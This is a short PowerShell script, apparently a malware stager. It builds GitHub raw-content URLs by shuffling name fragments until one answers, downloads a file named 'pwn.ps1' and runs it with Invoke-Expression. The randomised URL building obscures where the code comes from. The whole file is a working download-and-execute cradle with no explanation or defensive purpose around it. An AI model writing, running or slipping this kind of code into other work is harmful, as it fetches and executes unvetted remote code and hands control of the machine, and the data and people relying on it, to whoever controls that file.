Function testUrl($url){
  $web=[System.Net.WebRequest]::Create($url)
  try {
    $res=$web.GetResponse()
  }catch{}
  $stat=$res.StatusCode
  If($stat-eq200){
    return $res.GetResponseStream()
  }Else{
    return $false
  }
}

Function getUrl($stream){
  $sr=New-Object System.IO.StreamReader $stream
  $res=$sr.ReadToEnd()
  Invoke-Expression($res)
}

function setUrl{
  $sub="tf","air","ane"
  $url=""
  for($i=0;$i-lt$sub.Length;$i++){
    $url+=$sub[(Get-Random -maximum $sub.Length)]
  }
  return "https://raw.githubusercontent.com/"+$url+"/Vectors/master/ps1/pwn.ps1"
}

Do{
  $url=(setUrl)
  write-host $url
}until(($s=testUrl($url)))
(getUrl($s))
